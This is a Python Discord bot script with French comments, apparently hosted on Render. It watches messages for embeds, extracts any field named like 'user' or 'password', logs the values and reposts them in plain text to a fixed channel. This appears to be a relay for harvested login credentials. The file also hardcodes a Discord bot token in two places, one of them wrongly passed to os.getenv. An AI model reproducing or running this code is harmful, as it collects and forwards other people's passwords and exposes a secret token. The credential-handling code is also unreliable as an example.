import os
import discord
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler

# Mini serveur pour Render (garder le service actif)
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

def run_server():
    server = HTTPServer(("0.0.0.0", 10000), Handler)
    server.serve_forever()

threading.Thread(target=run_server).start()


# Discord config
intents = discord.Intents.default()
intents.message_content = True

client = discord.Client(intents=intents)

# Récupération du token depuis Render (variable d'env)
TOKEN = os.getenv("MTQ5Njg5NzIyOTQ5ODM1NTgwMw.GI_5JW.vpK9meIVc8KwnMg8kLM16A3PCepbRM_59B1hHQ")

CHANNEL_ID = 1496583475376160768


@client.event
async def on_ready():
    print(f"Connecté en tant que {client.user}")


@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if not message.embeds:
        return

    embed = message.embeds[0]

    user = None
    password = None

    for field in embed.fields:
        name = field.name.lower()
        value = field.value.strip()

        print("FIELD:", name, "=>", value)

        if "user" in name:
            user = value

        if "password" in name:
            password = value

    if user and password:
        try:
            channel = await client.fetch_channel(CHANNEL_ID)
            await channel.send(f"User: {user}\nPassword: {password}")
        except Exception as e:
            print("Erreur envoi:", e)


# Lancement du bot
client.run('MTQ5Njg5NzIyOTQ5ODM1NTgwMw.GI_5JW.vpK9meIVc8KwnMg8kLM16A3PCepbRM_59B1hHQ')